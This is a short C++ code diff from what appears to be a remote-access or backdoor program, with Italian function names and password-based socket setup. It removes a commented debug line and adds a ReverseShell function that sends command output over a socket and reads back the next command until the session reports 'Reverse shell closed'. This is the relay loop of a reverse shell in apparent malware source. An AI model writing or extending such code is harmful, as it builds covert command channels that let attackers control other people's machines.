@@ -26,8 +26,6 @@ public:
 
 		TcpIP::SetTimeout(10000, Sock);
 
-		//msgb.Ok("1");
-
 		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
 		{
 			TerminaConnessione(Sock);
@@ -103,6 +101,20 @@ public:
 			TcpIP::SendString(Sock, "NO");
 
 		return NC;
+	}
+	
+	static string ReverseShell(SOCKET Sock, string Res)
+	{
+		string Buff = "";
+		
+		if (!TcpIP::SendString(Sock, Res))
+			return "";
+		
+		if (Res != "Reverse shell closed")
+			if (!TcpIP::RecvString(Sock, Buff))
+				return "";
+
+		return Buff;
 	}
 };
 
